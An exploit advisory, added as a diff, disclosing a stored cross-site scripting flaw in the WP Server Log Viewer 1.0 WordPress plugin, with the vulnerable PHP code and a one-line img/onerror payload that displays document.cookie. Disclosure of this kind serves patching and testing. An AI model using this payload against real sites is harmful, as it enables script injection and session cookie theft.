@@ -1,0 +1,41 @@
+# Exploit Title: WP Server Log Viewer 1.0 - 'logfile' Persistent Cross-Site Scripting
+# Date: 2019-09-10
+# Exploit Author: strider
+# Software Link: https://github.com/anttiviljami/wp-server-log-viewer
+# Version: 1.0
+# Tested on: Debian 10 Buster x64 / Kali Linux
+# CVE : None
+
+====================================[Description]====================================
+This plugin allows you to add logfiles via wp-admin. The problem here is that the file paths are stored unfiltered/unescaped. This gives the possibility of a persistent XSS attack.
+
+
+====================================[Codepart]====================================
+
+if( isset( $_GET['action'] ) && 'new' === $_GET['action'] && isset( $_GET['logpath'] ) ) {
+      // new log was added
+      $logs = get_option( 'server_logs' );
+      if( is_null( $logs ) ) {
+        $logs = [];
+      }
+
+      $log = trim( $_GET['logpath'] ); //only trimmed string no escaping
+      $logs[] = $log; //here the log will be added without security checks
+      $logs = array_values( $logs );
+
+      $index = array_search( $log, $logs );
+
+      update_option( 'server_logs', $logs );
+
+      wp_safe_redirect( admin_url('tools.php?page=wp-server-log-viewer&log=' . $index) );
+    }
+
+
+
+====================================[Proof of Concept]====================================
+Add new log file to the plugin.
+paste this exploit into the form and submit it.
+
+<img src=# onerror=alert(document.cookie);>log.txt
+
+It tries to render an image and triggers the onerror event and prints the cookie. in the tab you see the log.txt
